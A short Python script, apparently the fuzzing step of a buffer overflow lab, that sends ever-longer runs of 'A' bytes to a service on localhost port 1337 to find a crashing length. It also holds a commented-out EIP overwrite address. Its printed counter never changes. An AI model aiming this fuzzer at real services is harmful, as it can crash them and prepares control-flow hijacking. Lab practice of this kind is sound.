import socket, time, sys, struct

ip = "127.0.0.1"
port = 1337
timeout = 1

# EIP = struct.pack("<L", (0x62501203))

# Create an array of increasing length buffer strings.
buffer = b""
counter = 100
while len(buffer) < 10000:
    buffer += b"A" * counter
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    connect = s.connect((ip, port))
    print(s.recv(1024))
    print(f"Count: {counter}")
    s.send(buffer)
    print(s.recv(1024))
    s.close()